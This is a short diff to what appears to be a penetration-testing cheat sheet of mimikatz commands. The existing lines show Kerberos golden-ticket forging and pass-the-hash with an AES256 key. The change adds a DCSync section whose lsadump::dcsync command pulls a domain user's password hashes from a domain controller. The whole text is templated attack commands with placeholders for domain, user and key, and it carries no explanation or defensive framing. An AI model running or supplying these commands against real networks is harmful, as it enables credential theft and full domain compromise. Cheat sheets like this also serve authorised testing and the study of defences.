@@ -39,3 +39,8 @@ mimikatz "kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /aes256:
 ```console
 mimikatz "sekurlsa::pth /user:<user> /aes256:<aes256_hmac> /domain:<domain> /run:cmd.exe" "exit"
 ```
+
+# dcsync
+```console
+mimikatz  "log" "lsadump::dcsync /domain:<domain>.local /user:<domain>\<user>" "exit"
+```
